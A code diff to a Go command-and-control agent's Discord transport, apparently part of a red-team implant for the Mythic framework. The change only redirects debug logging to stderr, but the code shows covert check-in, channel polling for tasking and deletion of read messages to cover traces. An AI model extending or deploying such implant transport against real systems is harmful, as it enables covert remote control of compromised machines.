@@ -22,6 +22,8 @@ import (
 	"sync/atomic"
 	"time"
 
+	"os"
+
 	"fawkes/pkg/structs"
 )
 
@@ -322,7 +324,7 @@ func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
 		return fmt.Errorf("failed to parse checkin response: %w", err)
 	}
 
-	log.Printf("[discord] checkin response keys: %v", func() []string {
+	fmt.Fprintf(os.Stderr, "[discord] checkin response keys: %v", func() []string {
 		keys := make([]string, 0, len(checkinResponse))
 		for k := range checkinResponse {
 			keys = append(keys, k)
@@ -332,23 +334,23 @@ func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
 	if callbackID, exists := checkinResponse["id"]; exists {
 		if callbackStr, ok := callbackID.(string); ok {
 			d.UpdateCallbackUUID(callbackStr)
-			log.Printf("[discord] session from 'id': %s", callbackStr)
+			fmt.Fprintf(os.Stderr, "[discord] session from 'id': %s", callbackStr)
 		} else {
-			log.Printf("[discord] 'id' field not string, type=%T value=%v", callbackID, callbackID)
+			fmt.Fprintf(os.Stderr, "[discord] 'id' field not string, type=%T value=%v", callbackID, callbackID)
 		}
 	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
 		if callbackStr, ok := callbackUUID.(string); ok {
 			d.UpdateCallbackUUID(callbackStr)
-			log.Printf("[discord] session from 'uuid': %s", callbackStr)
+			fmt.Fprintf(os.Stderr, "[discord] session from 'uuid': %s", callbackStr)
 		}
 	} else {
-		log.Printf("[discord] no session id, using default payload UUID")
+		fmt.Fprintf(os.Stderr, "[discord] no session id, using default payload UUID")
 		d.UpdateCallbackUUID(agent.PayloadUUID)
 	}
 
 	// Verify UUID was stored
 	verifyUUID := d.GetCallbackUUID()
-	log.Printf("[discord] verified callback UUID after checkin: %s", verifyUUID)
+	fmt.Fprintf(os.Stderr, "[discord] verified callback UUID after checkin: %s", verifyUUID)
 
 	return nil
 }
@@ -621,7 +623,7 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 	}
 
 	// Poll for response matching our sender_id with to_server=false
-	log.Printf("[discord] sendAndPoll: senderID=%s clientID=%s msgLen=%d", senderID, clientID, len(mythicMessage))
+	fmt.Fprintf(os.Stderr, "[discord] sendAndPoll: senderID=%s clientID=%s msgLen=%d", senderID, clientID, len(mythicMessage))
 	for attempt := 0; attempt < d.MaxRetries; attempt++ {
 		time.Sleep(time.Duration(d.PollInterval) * time.Second)
 
@@ -631,22 +633,22 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 			continue
 		}
 
-		log.Printf("[discord] poll %d: %d messages in channel", attempt+1, len(messages))
+		fmt.Fprintf(os.Stderr, "[discord] poll %d: %d messages in channel", attempt+1, len(messages))
 		for _, msg := range messages {
 			respWrapper, err := d.parseDiscordMessage(msg, cfg)
 			if err != nil {
-				log.Printf("[discord]   msg %s: parse error: %v", msg.ID, err)
+				fmt.Fprintf(os.Stderr, "[discord]   msg %s: parse error: %v", msg.ID, err)
 				continue
 			}
 
-			log.Printf("[discord]   msg %s: to_server=%v client_id=%s sender_id=%s", msg.ID, respWrapper.ToServer, respWrapper.ClientID, respWrapper.SenderID)
+			fmt.Fprintf(os.Stderr, "[discord]   msg %s: to_server=%v client_id=%s sender_id=%s", msg.ID, respWrapper.ToServer, respWrapper.ClientID, respWrapper.SenderID)
 
 			// Match: to_server=false and one of:
 			// - client_id matches our tracking ID (clientID)
 			// - sender_id matches us (senderID)
 			// - client_id matches our sender_id (server echoes sender_id as client_id)
 			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID || respWrapper.ClientID == senderID) {
-				log.Printf("[discord]   MATCHED! deleting msg %s", msg.ID)
+				fmt.Fprintf(os.Stderr, "[discord]   MATCHED! deleting msg %s", msg.ID)
 				// Delete the response message from the channel after reading
 				d.deleteMessage(msg.ID, cfg)
 				return respWrapper.Message, nil
